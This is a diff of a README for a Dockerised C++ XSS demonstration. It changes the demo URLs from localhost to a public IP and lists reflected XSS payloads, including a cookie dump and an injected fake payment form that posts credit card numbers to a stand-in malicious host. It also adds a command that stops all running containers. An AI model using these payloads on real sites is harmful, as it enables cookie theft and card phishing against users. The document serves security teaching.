@@ -8,35 +8,38 @@ docker build -t cpp-xss-demo .
 docker run -p 80XX:8080 cpp-xss-demo
 ```
 
+
+
+
 Then open:
 
 ```plaintext
 
-http://localhost:8080/?name=John%20Doe
-http://localhost:8080/?name=Varsha%20Sharma
+http://128.199.23.136:80XX/?name=John%20Doe
+http://128.199.23.136:80XX/?name=Varsha%20Sharma
 
 
-http://localhost:8080/?name=<script>alert('XSS')</script>
-
-
-
+http://128.199.23.136:80XX/?name=<script>alert('XSS')</script>
 
 
 
 
 
 
-http://localhost:8080/?name=<script>document.write(document.cookie)</script>
 
 
 
-http://localhost:8080/?name=<script>var form=document.createElement('form');form.setAttribute('method','post');form.setAttribute('action','http://malicious-site.com/payment');var amountInput=document.createElement('input');amountInput.setAttribute('type','hidden');amountInput.setAttribute('name','amount');amountInput.setAttribute('value','100');var ccInput=document.createElement('input');ccInput.setAttribute('type','text');ccInput.setAttribute('name','credit_card');ccInput.setAttribute('placeholder','Enter your credit card number');var submitButton=document.createElement('input');submitButton.setAttribute('type','submit');submitButton.setAttribute('value','Pay $100 to get more information');form.appendChild(amountInput);form.appendChild(ccInput);form.appendChild(submitButton);document.body.appendChild(form);</script>
+http://128.199.23.136:80XX/?name=<script>document.write(document.cookie)</script>
+
+
+
+http://128.199.23.136:80XX/?name=<script>var form=document.createElement('form');form.setAttribute('method','post');form.setAttribute('action','http://malicious-site.com/payment');var amountInput=document.createElement('input');amountInput.setAttribute('type','hidden');amountInput.setAttribute('name','amount');amountInput.setAttribute('value','100');var ccInput=document.createElement('input');ccInput.setAttribute('type','text');ccInput.setAttribute('name','credit_card');ccInput.setAttribute('placeholder','Enter your credit card number');var submitButton=document.createElement('input');submitButton.setAttribute('type','submit');submitButton.setAttribute('value','Pay $100 to get more information');form.appendChild(amountInput);form.appendChild(ccInput);form.appendChild(submitButton);document.body.appendChild(form);</script>
 
 
 
 
 
-
+docker stop $(docker ps -q)
 
 
 
